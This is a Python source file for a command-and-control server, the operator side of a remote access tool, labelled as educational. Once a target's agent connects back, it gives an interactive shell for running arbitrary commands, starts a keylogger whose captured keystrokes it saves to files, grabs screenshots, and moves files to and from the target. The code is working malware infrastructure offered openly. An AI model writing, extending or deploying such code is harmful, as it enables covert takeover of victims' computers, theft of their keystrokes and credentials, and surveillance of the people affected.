#!/usr/bin/python
"""
C2 Server
---------
This script acts as the Command & Control (C2) server for the Remote Shell system.
It listens for incoming connections from agents and provides a shell interface
to execute commands on the target machine.

Educational Purpose Only:
This code is for learning about C2 architectures and network programming.
"""

import socket
import os
import time
import json
import struct
from datetime import datetime

try:
    import readline
except ImportError:
    try:
        import pyreadline3 as readline
    except ImportError:
        print("[!] readline not available. Tab autocomplete disabled.")
        readline = None


class C2Server:
    """
    Command & Control Server class.
    Handles incoming connections and provides an interactive shell.
    """

    # Configuration
    BIND_IP = '0.0.0.0'  # Listen on all interfaces
    BIND_PORT = 5555
    LISTEN_BACKLOG = 5
    
    COMMANDS = [
        'sysinfo', 'screenshot', 'keylog_start', 'keylog_stop',
        'download', 'upload', 'cat', 'cd', 'ls', 'pwd',
        'clear', 'cls', 'quit', 'help'
    ]

    def __init__(self):
        self.server_socket = None
        self.target_socket = None
        self.remote_ip = None
        self.base_filename = None
        self.log_filename = None
        self.screenshot_filename = None
        self.keylog_buffer = ""
        self.remote_file_cache = []  # Cache for remote filenames
        self._setup_autocomplete()

    def _setup_autocomplete(self):
        """Sets up tab autocomplete for the shell."""
        if readline:
            readline.parse_and_bind("tab: complete")
            readline.set_completer(self._completer)

    def _completer(self, text, state):
        """Autocomplete function for readline."""
        buffer = readline.get_line_buffer()
        line = buffer.split()
        
        # If no command typed yet, complete commands
        if not line or (len(line) == 1 and buffer[-1] != ' '):
            options = [cmd for cmd in self.COMMANDS if cmd.startswith(text)]
            if state < len(options):
                return options[state]
        
        # Command specific completion
        cmd = line[0]
        
        # Local file completion
        if cmd == 'upload':
            return self._complete_path(text, state)
            
        # Remote file completion (from cache)
        elif cmd in ['download', 'cat', 'cd']:
            options = [f for f in self.remote_file_cache if f.startswith(text)]
            if state < len(options):
                return options[state]
            
        return None

    def _complete_path(self, text, state):
        """Helper to autocomplete local file paths."""
        if '~' in text:
            text = os.path.expanduser(text)
        
        dirname, filename = os.path.split(text)
        if not dirname:
            dirname = '.'
            
        if not os.path.isdir(dirname):
            return None
            
        options = []
        for name in os.listdir(dirname):
            if name.startswith(filename):
                if dirname != '.':
                    options.append(os.path.join(dirname, name))
                else:
                    options.append(name)
                    
        if state < len(options):
            return options[state]
        return None

    def start(self):
        """
        Initializes the server and waits for a connection.
        """
        self._setup_filenames()
        self._bind_socket()
        self._accept_connection()
        self._shell_loop()

    def _setup_filenames(self):
        """Sets up filenames for logs and screenshots based on timestamp."""
        timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
        self.base_filename = f"session_{timestamp}"
        self.log_filename = f"{self.base_filename}.log"
        self.screenshot_filename = f"{self.base_filename}.png"

    def _bind_socket(self):
        """Creates and binds the server socket."""
        try:
            self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.server_socket.bind((self.BIND_IP, self.BIND_PORT))
            self.server_socket.listen(self.LISTEN_BACKLOG)
            print(f"[+] Listening on {self.BIND_IP}:{self.BIND_PORT}...")
        except Exception as e:
            print(f"[!] Failed to bind socket: {e}")
            exit(1)

    def _accept_connection(self):
        """Waits for and accepts an incoming connection."""
        try:
            self.target_socket, address = self.server_socket.accept()
            self.remote_ip = address[0]
            print(f"[+] Connection established from: {self.remote_ip}")
        except Exception as e:
            print(f"[!] Error accepting connection: {e}")
            exit(1)

    def _shell_loop(self):
        """Main interactive shell loop."""
        print("\n[*] Type 'help' for a list of commands.\n")

        while True:
            try:
                command = input("Shell> ").strip()
                if not command:
                    continue

                if command.lower() == 'help':
                    self._print_help()
                    continue

                elif command.lower() == 'quit':
                    self._send_json('quit')
                    self._save_keylog()
                    self.target_socket.close()
                    self.server_socket.close()
                    print("[*] Server closed.")
                    break

                elif command.lower() == 'clear' or command.lower() == 'cls':
                    os.system('cls' if os.name == 'nt' else 'clear')
                    continue

                elif command.startswith('cd '):
                    self._send_json(command)
                    continue

                elif command == 'ls':
                    # Special handling for 'ls' to populate cache
                    self._send_json(command)
                    result = self._receive_json()
                    if result:
                        print(result)
                        # Update cache (split by newline)
                        self.remote_file_cache = result.split('\n')
                    continue

                elif command.startswith('ls'):
                    # Pass other ls commands (ls -la) directly
                    self._send_json(command)
                    result = self._receive_json()
                    print(result)
                    continue

                elif command == 'pwd':
                    self._send_json(command)
                    result = self._receive_json()
                    print(result)
                    continue

                elif command == 'keylog_start':
                    self._send_json('keylog_start')
                    print("[*] Keylogger started on target. Press Ctrl+C to stop and save.")
                    try:
                        self._receive_keylogs()
                    except KeyboardInterrupt:
                        print("\n[*] Stopping keylogger...")
                        self._send_json('keylog_stop')
                        self._save_keylog()
                    continue

                elif command.startswith('download '):
                    self._send_json(command)
                    self._receive_file(command[9:].strip())
                    continue

                elif command.startswith('upload '):
                    filename = command[7:].strip()
                    if not os.path.exists(filename):
                        print(f"[!] File '{filename}' not found.")
                        continue
                    self._send_json(command)
                    self._send_file(filename)
                    continue

                elif command.startswith('cat '):
                    self._send_json(command)
                    result = self._receive_json()
                    print(result)
                    continue

                elif command == 'screenshot':
                    self._send_json(command)
                    self._receive_screenshot()
                    continue

                elif command == 'sysinfo':
                    self._send_json(command)
                    result = self._receive_json()
                    print(result)
                    continue

                else:
                    # Send arbitrary command
                    self._send_json(command)
                    result = self._receive_json()
                    print(result)

            except KeyboardInterrupt:
                print("\n[!] Type 'quit' to exit.")
            except (socket.error, ConnectionError) as e:
                print(f"[!] Connection lost: {e}")
                break
            except Exception as e:
                print(f"[!] Error: {e}")
                # Do not break the loop for non-critical errors
                continue

    def _print_help(self):
        """Prints available commands."""
        print("""
        Available Commands:
        -------------------
        sysinfo             : Get system information
        screenshot          : Capture screen
        keylog_start        : Start keylogger (Ctrl+C to stop)
        download <file>     : Download file from target
        upload <file>       : Upload file to target
        cat <file>          : Read file content
        cd <path>           : Change directory
        ls / ls -la         : List directory contents
        pwd                 : Print working directory
        clear / cls         : Clear screen
        quit                : Exit shell
        """)

    def _send_json(self, data):
        """Sends data as JSON."""
        try:
            json_data = json.dumps(data)
            self.target_socket.send(json_data.encode())
        except Exception as e:
            print(f"[!] Send error: {e}")

    def _receive_json(self):
        """Receives and decodes JSON data."""
        received_data = ''
        while True:
            try:
                chunk = self.target_socket.recv(1024).decode()
                if not chunk:
                    return None
                received_data += chunk
                return json.loads(received_data)
            except json.JSONDecodeError:
                continue
            except Exception:
                return None

    def _receive_keylogs(self):
        """Receives keylogs stream until interrupted."""
        self.keylog_buffer = ""
        while True:
            chunk = self.target_socket.recv(1024).decode()
            if not chunk:
                break
            print(chunk, end='', flush=True)
            self.keylog_buffer += chunk

    def _save_keylog(self):
        """Saves captured keylogs to file."""
        if not self.keylog_buffer:
            return
        
        # Ensure unique filename if multiple logs in one session
        count = 1
        filename = self.log_filename
        while os.path.exists(filename):
            filename = f"{self.base_filename}_{count}.log"
            count += 1

        try:
            with open(filename, "w") as f:
                f.write(self.keylog_buffer)
            print(f"\n[+] Keylogs saved to: {filename}")
        except Exception as e:
            print(f"[!] Error saving keylogs: {e}")

    def _send_file(self, filename):
        """Sends a file to the target."""
        try:
            print(f"[*] Uploading {filename}...")
            with open(filename, 'rb') as f:
                self.target_socket.send(f.read())
            print("[+] Upload complete.")
        except Exception as e:
            print(f"[!] Upload error: {e}")

    def _receive_file(self, filename):
        """Receives a file from the target."""
        try:
            print(f"[*] Downloading {filename}...")
            # Use basename to avoid directory traversal issues
            local_filename = os.path.basename(filename)
            
            with open(local_filename, 'wb') as f:
                self.target_socket.settimeout(2)
                while True:
                    try:
                        chunk = self.target_socket.recv(1024)
                        if not chunk:
                            break
                        f.write(chunk)
                    except socket.timeout:
                        break
            self.target_socket.settimeout(None)
            print(f"[+] Download complete: {local_filename}")
        except Exception as e:
            print(f"[!] Download error: {e}")

    def _receive_screenshot(self):
        """Receives a screenshot file using length-prefixed protocol."""
        # Ensure unique filename
        count = 1
        filename = self.screenshot_filename
        while os.path.exists(filename):
            filename = f"{self.base_filename}_{count}.png"
            count += 1

        try:
            print("[*] Receiving screenshot...")
            
            # Read 4 bytes for the size
            raw_size = self._recv_all(4)
            if not raw_size:
                return
            
            # Unpack size (big-endian unsigned int)
            image_size = struct.unpack('>I', raw_size)[0]
            print(f"[*] Expecting {image_size} bytes...")

            # Read exactly image_size bytes
            image_data = self._recv_all(image_size)
            
            if image_data:
                with open(filename, 'wb') as f:
                    f.write(image_data)
                print(f"[+] Screenshot saved: {filename}")
            else:
                print("[!] Failed to receive image data.")

        except Exception as e:
            print(f"[!] Screenshot error: {e}")

    def _recv_all(self, n):
        """Helper to receive exactly n bytes."""
        data = b''
        while len(data) < n:
            packet = self.target_socket.recv(n - len(data))
            if not packet:
                return None
            data += packet
        return data


if __name__ == "__main__":
    server = C2Server()
    server.start()
